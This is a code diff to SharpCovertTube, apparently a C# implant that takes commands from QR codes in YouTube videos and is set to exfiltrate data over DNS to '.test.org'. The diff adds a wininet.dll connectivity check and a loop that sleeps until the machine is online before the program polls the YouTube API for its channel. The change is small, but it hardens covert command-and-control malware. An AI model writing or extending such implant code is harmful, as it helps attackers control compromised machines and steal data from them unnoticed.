@@ -8,7 +8,7 @@ using System.Diagnostics;
 using System.Collections.Generic;
 using SharpCovertTube.QRCodeDecoder;
 using System.Security.Cryptography;
-
+using System.Runtime.InteropServices;
 
 namespace SharpCovertTube
 {
@@ -35,6 +35,8 @@ namespace SharpCovertTube
         public const bool dns_exfiltration = true;
         // DNS hostname used for DNS exfiltration
         public const string dns_hostname = ".test.org";
+
+        [DllImport("wininet.dll")] private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
 
 
         static void LogShow(string msg) {
@@ -311,11 +313,22 @@ namespace SharpCovertTube
         }
 
 
+        public static bool IsConnectedToInternet()
+        {
+            int Desc;
+            return InternetGetConnectedState(out Desc, 0);
+        }
+
+
         static void Main(string[] args)
         {
             if (channel_id == "" || api_key == "") {
                 LogShow("It is necessary to fill the channel_id and api_key values before running the program.");
                 System.Environment.Exit(0);
+            }
+            while (!IsConnectedToInternet())
+            {
+                System.Threading.Thread.Sleep(1000 * 60);
             }
             LogShow("Monitoring Youtube channel with id " + channel_id);
             string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
